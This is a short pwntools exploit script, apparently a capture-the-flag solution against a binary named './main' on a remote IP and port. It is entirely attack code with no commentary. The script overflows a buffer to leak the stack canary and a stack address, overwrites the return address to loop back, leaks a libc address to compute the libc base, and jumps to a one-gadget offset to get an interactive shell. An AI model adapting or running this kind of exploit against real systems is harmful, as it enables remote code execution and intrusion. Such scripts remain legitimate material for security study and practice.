from pwn import*
p = process('./main')
p = remote('124.156.121.112',28051)
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
context.log_level ='DEBUG'
p.sendafter('hello?','U'*0x25 + 'FMYY')
p.recvuntil('FMYY')
canary = u64(p.recv(7).rjust(8,'\x00'))
log.info('Canary:\t' + hex(canary))
stack = u64(p.recv(6).ljust(8,'\x00')) - 304
payload = '\x00'*0x28 + p64(canary) + '\x00'*0x10 + p64(stack) + '\xF0\xD7'
p.send(payload)
p.send('U'*0x44 + 'FMYY')
p.recvuntil('FMYY')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['__libc_start_main'] - 240
log.info('LIBC:\t'+ hex(libc_base))
rce = libc_base + 0xF1147
p.send('\x00'*0x28 + p64(canary) + '\x00'*0x10 + p64(stack) + p64(rce))


p.interactive()
